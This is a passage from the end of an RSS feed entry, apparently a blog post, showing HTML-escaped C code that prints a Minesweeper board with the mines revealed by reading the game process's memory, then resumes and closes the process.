                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; ((row[i] &amp;amp; &lt;span style=&#34;color:#3677a9&#34;&gt;0xffu&lt;/span&gt;) == &lt;span style=&#34;color:#3677a9&#34;&gt;0x8f&lt;/span&gt;)
                    row[i] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;X&amp;#39;&lt;/span&gt;;
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;else&lt;/span&gt;
                    row[i] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;;
            } &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (row[++i] != &lt;span style=&#34;color:#3677a9&#34;&gt;0x10&lt;/span&gt;);
            printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;%.*s&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, width, row+&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;);
        }

        NtResumeProcess(hProcess);
        WaitForSingleObject(hProcess, -&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;);
        CloseHandle(hProcess);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/ms/mines_success.png&#34; alt=&#34;Image1&#34;  /&gt;&lt;/p&gt;</description>
        </item>
        
    </channel>
</rss>
